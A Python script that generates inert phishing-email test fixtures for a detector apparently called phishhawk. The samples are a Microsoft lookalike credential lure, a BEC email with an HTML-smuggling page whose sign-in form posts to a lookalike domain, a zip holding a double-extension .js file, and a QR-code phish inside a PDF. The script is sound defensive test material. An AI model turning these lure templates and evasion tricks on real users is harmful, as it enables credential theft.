"""Regenerates the .eml fixtures in samples/. Output is committed; rerunning
is byte-for-byte deterministic (fixed dates and MIME boundaries).

Every fixture is inert: the domains resolve nowhere, the HTML has no working
endpoint, the "payloads" are plain-text comments. They exist to exercise the
detectors, and each one says so inside.
"""

import base64
import io
import os
import zipfile
import zlib
from email import policy
from email.message import EmailMessage
from email.parser import BytesParser

OUT = os.path.dirname(os.path.abspath(__file__))
BANNER = "INERT TEST FIXTURE - phishhawk sample corpus. No working endpoint, no payload."


def fix_boundaries(msg: EmailMessage, name: str) -> None:
    for index, part in enumerate(msg.walk()):
        if part.is_multipart():
            part.set_boundary("==%s-%d==" % (name, index))


def prepend(msg: EmailMessage, headers) -> None:
    for header_name, value in reversed(headers):
        msg._headers.insert(0, (header_name, value))


def write(msg: EmailMessage, filename: str) -> bytes:
    fix_boundaries(msg, filename.split(".")[0])
    data = msg.as_bytes()
    with open(os.path.join(OUT, filename), "wb") as handle:
        handle.write(data)
    return data


# ---------------------------------------------------------------- 1. phish --
ATTACHMENT = """<!doctype html>
<!-- INERT TEST FIXTURE - part of the phishhawk sample corpus.
     No form action, no script, no real endpoint. Do not "fix" this file. -->
<html><head><title>Voicemail_Transcript</title></head>
<body style="font-family:Segoe UI,sans-serif">
  <p>Your document is loading&hellip;</p>
  <p>If nothing happens, <a href="https://micros0ft-verify-support.top/o365/login?id=8841">continue here</a>.</p>
</body></html>
"""
TEXT = """Microsoft account security alert

Unusual sign-in activity was detected on your account. Your access will be
suspended within 24 hours unless you verify your identity.

Verify now: https://micros0ft-verify-support.top/o365/login?id=8841
Mirror link: https://bit.ly/3xQvErT
Status page: http://185.243.115.22/status

Open the attached transcript for details.

Microsoft Account Team
"""
HTML = """<html><body style="font-family:Segoe UI,Arial,sans-serif;color:#222">
<img src="https://micros0ft-verify-support.top/pixel/open.gif?id=8841" width="1" height="1">
<h2>Unusual sign-in activity</h2>
<p>We detected a sign-in from an unrecognised device. Your mailbox will be
<b>suspended within 24 hours</b> unless you confirm your identity.</p>
<p><a href="https://micros0ft-verify-support.top/o365/login?id=8841">https://login.microsoftonline.com/verify</a></p>
<p>Alternative link: <a href="https://bit.ly/3xQvErT">click here</a></p>
<p>Server status: <a href="http://185.243.115.22/status">185.243.115.22</a></p>
<p style="font-size:11px;color:#888">Microsoft Corporation, One Microsoft Way, Redmond WA.
Questions? helpdesk@micros0ft-verify-support.top</p>
</body></html>
"""
phish = EmailMessage()
phish["Subject"] = "Action required: unusual sign-in activity on your account"
phish["From"] = '"Microsoft Account Team" <security-alert@micros0ft-verify-support.top>'
phish["To"] = "vinit.rami@example-corp.co.uk"
phish["Reply-To"] = "recovery.desk@mail-secure-recovery.xyz"
phish["Date"] = "Tue, 16 Sep 2026 03:14:52 +0000"
phish["Message-ID"] = "<f2a91c77-3b8e-4a21-9d55-0e1b77c3a9d4@mail-relay-07.sendgrid-bulk.top>"
phish["X-Mailer"] = "PHPMailer 6.8.0"
phish["List-Unsubscribe"] = "<https://mail-secure-recovery.xyz/unsub?u=8841>"
phish.set_content(TEXT)
phish.add_alternative(HTML, subtype="html")
phish.add_attachment(ATTACHMENT.encode(), maintype="text", subtype="html",
                     filename="Voicemail_Transcript.pdf.html")
prepend(phish, [
    ("Return-Path", "<bounce-8841@mail-relay-07.sendgrid-bulk.top>"),
    ("Received", "from mx01.example-corp.co.uk (10.20.4.11) by EXCH02.example-corp.local "
                 "(10.20.4.30) with Microsoft SMTP Server; Tue, 16 Sep 2026 03:15:04 +0000"),
    ("Received", "from mail-relay-07.sendgrid-bulk.top (mail-relay-07.sendgrid-bulk.top "
                 "[185.243.115.22]) by mx01.example-corp.co.uk with ESMTPS; "
                 "Tue, 16 Sep 2026 03:15:01 +0000"),
    ("Authentication-Results", "mx01.example-corp.co.uk; spf=fail "
                               "smtp.mailfrom=mail-relay-07.sendgrid-bulk.top; dkim=none; "
                               "dmarc=fail action=quarantine header.from=micros0ft-verify-support.top"),
    ("Received-SPF", "fail (mx01.example-corp.co.uk: domain of mail-relay-07.sendgrid-bulk.top "
                     "does not designate 185.243.115.22 as permitted sender)"),
    ("X-Originating-IP", "[185.243.115.22]"),
])
phish_bytes = write(phish, "sample_phish.eml")

# --------------------------------------------------------------- 2. benign --
benign = EmailMessage()
benign["Subject"] = "Your October invoice is ready"
benign["From"] = '"Example Corp Billing" <billing@example-corp.co.uk>'
benign["To"] = "vinit.rami@example-corp.co.uk"
benign["Date"] = "Mon, 01 Sep 2026 09:02:11 +0000"
benign["Message-ID"] = "<20260901090211.7c1a@example-corp.co.uk>"
benign.set_content("Hello Vinit,\n\nYour October invoice is available in the billing portal:\n"
                   "https://billing.example-corp.co.uk/invoices/2026-10\n\nThanks,\nBilling team\n")
benign.add_alternative(
    '<html><body><p>Hello Vinit,</p><p>Your October invoice is available in the '
    '<a href="https://billing.example-corp.co.uk/invoices/2026-10">billing portal</a>.</p>'
    "<p>Thanks,<br>Billing team</p></body></html>", subtype="html")
prepend(benign, [
    ("Return-Path", "<billing@example-corp.co.uk>"),
    ("Received", "from smtp.example-corp.co.uk (203.0.113.24) by mx01.example-corp.co.uk "
                 "with ESMTPS; Mon, 01 Sep 2026 09:02:13 +0000"),
    ("Authentication-Results", "mx01.example-corp.co.uk; spf=pass smtp.mailfrom=example-corp.co.uk; "
                               "dkim=pass header.d=example-corp.co.uk; dmarc=pass"),
])
write(benign, "sample_benign.eml")

# ------------------------------------------------- 3. user-reported forward --
# What a SOC mailbox actually receives: the phish attached to a colleague's note.
reported = EmailMessage()
reported["Subject"] = "FW: Action required: unusual sign-in activity on your account"
reported["From"] = '"Priya Shah" <priya.shah@example-corp.co.uk>'
reported["To"] = "phishing-reports@example-corp.co.uk"
reported["Date"] = "Tue, 16 Sep 2026 08:41:09 +0000"
reported["Message-ID"] = "<report-20260916-0841@example-corp.co.uk>"
reported.set_content("Hi team, this landed in my inbox this morning and looks off. "
                     "I have not clicked anything.\n\nPriya\n")
reported.add_attachment(BytesParser(policy=policy.default).parsebytes(phish_bytes))
prepend(reported, [
    ("Received", "from EXCH02.example-corp.local (10.20.4.30) by EXCH01.example-corp.local "
                 "(10.20.4.29); Tue, 16 Sep 2026 08:41:10 +0000"),
    ("Authentication-Results", "mx01.example-corp.co.uk; spf=pass; dkim=pass; dmarc=pass"),
])
write(reported, "sample_reported.eml")

# ------------------------------------------ 4. BEC + HTML smuggling + archive --
decoy_url = "https://files.examp1e-corp.top/share/Q3-payroll-review"
SMUGGLER = """<!doctype html>
<!-- %s -->
<html><head><title>Shared document</title></head><body>
<h3>Example Corp SharePoint</h3>
<p>Sign in to view the shared payroll review.</p>
<form action="https://sso.examp1e-corp.top/owa/auth" method="post">
  <input type="email" name="u"><input type="password" name="p"><button>Sign in</button>
</form>
<script>
  // Classic smuggling shape, with an inert string where a payload would be.
  var target = atob("%s");
  var blob = new Blob(["inert fixture"], {type: "text/plain"});
  var link = URL.createObjectURL(blob);
</script>
</body></html>
""" % (BANNER, base64.b64encode(decoy_url.encode()).decode())

archive_buffer = io.BytesIO()
with zipfile.ZipFile(archive_buffer, "w", zipfile.ZIP_DEFLATED) as archive:
    for name, text in (("Invoice_0923.pdf.js", "// %s\n" % BANNER), ("readme.txt", BANNER + "\n")):
        info = zipfile.ZipInfo(name, date_time=(2026, 9, 22, 9, 0, 0))
        info.compress_type = zipfile.ZIP_DEFLATED
        archive.writestr(info, text)

bec = EmailMessage()
bec["Subject"] = "Urgent: password expires today - payroll review shared with you"
bec["From"] = '"IT Service Desk" <it-servicedesk@examp1e-corp.co.uk>'
bec["To"] = "vinit.rami@example-corp.co.uk"
bec["Date"] = "Mon, 22 Sep 2026 09:12:40 +0000"
bec["Message-ID"] = "<9b1e0c55-0a3f-4c7e-b2d1-77c2e8f1a904@examp1e-corp.co.uk>"
bec.set_content("Hi,\n\nYour pass​word ex​pires today. The Q3 payroll re​view has been "
                "shared with you - open the attached document and sign in to keep access.\n\n"
                "IT Service Desk\n")
bec.add_attachment(SMUGGLER.encode(), maintype="text", subtype="html", filename="Shared_Document.htm")
bec.add_attachment(archive_buffer.getvalue(), maintype="application", subtype="zip",
                   filename="Invoice_0923.zip")
bec.add_attachment(("<html><!-- %s --><body>scan</body></html>\n" % BANNER).encode(),
                   maintype="application", subtype="pdf", filename="Scan_0922.pdf")
prepend(bec, [
    ("Return-Path", "<it-servicedesk@examp1e-corp.co.uk>"),
    ("Received", "from mail.examp1e-corp.co.uk (mail.examp1e-corp.co.uk [45.148.10.77]) by "
                 "mx01.example-corp.co.uk with ESMTPS; Mon, 22 Sep 2026 09:12:44 +0000"),
    ("Authentication-Results", "mx01.example-corp.co.uk; spf=pass smtp.mailfrom=examp1e-corp.co.uk; "
                               "dkim=pass header.d=examp1e-corp.co.uk; dmarc=pass"),
])
write(bec, "sample_bec_smuggling.eml")


# ------------------------------------------------------------- 5. quishing --
# The link is inside a QR code inside a PDF: nothing in the body for a gateway
# to rewrite or a desktop to hover over. Needs segno (pip install segno).
def qr_pdf(payload: str, caption: str) -> bytes:
    import segno  # noqa: PLC0415 - only needed to regenerate this fixture

    matrix = segno.make(payload, error="m").matrix
    scale, quiet = 6, 4
    side = (len(matrix) + 2 * quiet) * scale
    rows = []
    for y in range(side):
        cells = matrix[y // scale - quiet] if quiet <= y // scale < quiet + len(matrix) else []
        rows.append(bytes(0 if 0 <= x // scale - quiet < len(cells) and cells[x // scale - quiet] else 255
                          for x in range(side)))
    image = zlib.compress(b"".join(rows), 9)
    text = ("BT /F1 13 Tf 72 740 Td (%s) Tj ET q 216 0 0 216 72 480 cm /Im0 Do Q" % caption).encode()
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /XObject << /Im0 5 0 R >> /Font << /F1 6 0 R >> >> >>",
        b"<< /Length %d >>\nstream\n" % len(text) + text + b"\nendstream",
        b"<< /Type /XObject /Subtype /Image /Width %d /Height %d /ColorSpace /DeviceGray "
        b"/BitsPerComponent 8 /Filter /FlateDecode /Length %d >>\nstream\n" % (side, side, len(image))
        + image + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out, offsets = bytearray(b"%%PDF-1.4\n%% %s\n" % BANNER.encode()), []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % number + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    out += b"".join(b"%010d 00000 n \n" % offset for offset in offsets)
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, xref)
    return bytes(out)


quish = EmailMessage()
quish["Subject"] = "Action required: re-enrol your multi-factor authentication by Friday"
quish["From"] = '"IT Service Desk" <it-servicedesk@example-corp-mfa.top>'
quish["To"] = "vinit.rami@example-corp.co.uk"
quish["Date"] = "Mon, 29 Sep 2026 08:41:07 +0000"
quish["Message-ID"] = "<20260929084107.51d2@example-corp-mfa.top>"
quish.set_content(
    "Hello,\n\nMicrosoft 365 multi-factor authentication is being upgraded. To keep access to your "
    "mailbox, open the attached notice and scan the QR code with your phone's camera by Friday.\n\n"
    "IT Service Desk\n\n" + BANNER + "\n")
quish.add_attachment(
    qr_pdf("https://example-corp-mfa.top/enrol?u=vinit.rami@example-corp.co.uk",
           "Scan with your phone to keep access to Microsoft 365"),
    maintype="application", subtype="pdf", filename="MFA_Enrolment_Notice.pdf")
prepend(quish, [
    ("Return-Path", "<bounce@example-corp-mfa.top>"),
    ("Received", "from mail.example-corp-mfa.top (mail.example-corp-mfa.top [185.225.73.19]) by "
                 "mx01.example-corp.co.uk with ESMTPS; Mon, 29 Sep 2026 08:41:09 +0000"),
    ("Authentication-Results", "mx01.example-corp.co.uk; spf=pass smtp.mailfrom=example-corp-mfa.top; "
                               "dkim=pass header.d=example-corp-mfa.top; dmarc=pass"),
])
write(quish, "sample_quishing.eml")
print("written:", sorted(f for f in os.listdir(OUT) if f.endswith(".eml")))
